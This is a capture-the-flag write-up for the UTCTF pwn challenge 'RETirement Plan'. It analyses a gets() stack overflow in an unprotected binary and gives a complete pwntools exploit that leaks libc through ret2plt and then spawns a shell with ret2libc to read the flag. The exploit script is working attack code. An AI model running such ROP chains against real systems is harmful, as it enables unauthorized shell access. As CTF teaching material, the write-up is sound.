https://ctftime.org/event/2641

# RETirement Plan (pwn)

nc challenge.utctf.live 9009

## Analysis

We can see that the binary has almost no mitigations enabled:

```bash
Arch:     amd64-64-little
RELRO:    Partial RELRO
Stack:    No canary found
NX:       NX unknown - GNU_STACK missing
PIE:      No PIE (0x400000)
Stack:    Executable
RWX:      Has RWX segments
```

This suggests there are many different ways to approach this task.

`main` @ `0x400616`:

- Calls `gets(local_48)`
- Does... something else, I don't know what, but will crash unless one or more stack slots after the return are not pointers to writeable addresses.

## Solution

1) Do ret2plt to bypass ASLR on libc.
2) Do ret2libc to get a shell. 

Note: in both cases you should take care to ensure that the stack contains pointers to writable addresses, e.g. in `.bss`, to ensure that `main` can actually reach the `ret` at the end without crashing.

```python
#!/usr/bin/env python3

from pwn import *

#context.log_level = "debug"
elf = ELF("./shellcode_patched", checksec=False)
context.binary = elf

libc = ELF("./libc.so.6", checksec=False)

#p = elf.process()
#p = elf.debug(gdbscript="b *0x40063c")
p = remote("challenge.utctf.live", 9009)

BSS = 0x601f00

rop = ROP(elf)
rop.raw(p64(BSS) * (0x48 // 8))
rop.puts(elf.got["puts"])
rop.raw(elf.sym["main"])
p.sendlineafter(b"here>: \n", rop.chain())

leak = u64(p.recv(6) + b"\x00\x00")
libc.address = leak - libc.sym["puts"]
#log.success(f"libc: {hex(libc.address)}")

rop = ROP(libc)
rop.raw(p64(BSS) * (0x48 // 8))
rop.rdi = p64(next(libc.search(b"/bin/sh\x00")))
rop.raw(p64(rop.find_gadget(['ret']).address)) # stack aligning ret
rop.call("system")
p.sendlineafter(b"here>: \n", rop.chain())

p.sendline(b"/bin/cat /flag.txt")

print(p.readuntil(b"}").decode()) # utflag{i_should_be_doing_ccdc_rn}
```

### Thoughts On The Solution

Given the binary name `shellcode` and the executable stack I suspect the author wanted us to write shellcode with `gets` and maybe use a `jmp rax` gadget to pivot into it. Not sure...

## Flag
`utflag{i_should_be_doing_ccdc_rn}`

smiley 2025/03/15
